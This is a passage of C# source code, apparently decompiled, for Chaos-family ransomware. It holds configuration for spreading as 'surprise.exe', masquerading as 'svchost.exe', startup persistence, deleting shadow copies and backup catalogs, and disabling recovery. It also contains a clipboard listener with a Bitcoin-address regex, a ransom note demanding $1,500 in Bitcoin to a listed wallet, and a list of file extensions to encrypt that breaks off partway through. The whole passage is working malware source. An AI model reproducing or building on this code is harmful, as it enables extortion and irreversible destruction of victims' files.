using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = true;

	private static int sleepTextbox = 4;

	private static string base64Image = "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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "hiiiii     im hacker.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[15]
	{
		"----> Chaos is multi language ransomware. Translate your note to any language <----", "All of your files have been encrypted", "Your computer was infected with a ransomware virus. Your files have been encrypted and you won't ", "be able to decrypt them without our help.What can I do to get my files back?You can buy our special ", "decryption software, this software will allow you to recover all of your data and remove the", "ransomware from your computer.The price for the software is $1,500. Payment can be made in Bitcoin only.", "How do I pay, where do I get Bitcoin?", "Purchasing Bitcoin varies from country to country, you are best advised to do a quick google search", "yourself  to find out how to buy Bitcoin. ", "Many of our customers have reported these sites to be fast and reliable:",
		"Coinmama - hxxps://www.coinmama.com Bitpanda - hxxps://www.bitpanda.com", "", "Payment informationAmount: 0.1473766 BTC", "Bitcoin Address:  bc1qlnzcep4l4ac0ttdrq7awxev9ehu465f2vpt9x0", ""
	};

	private static string[] validExtensions = new string[231]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
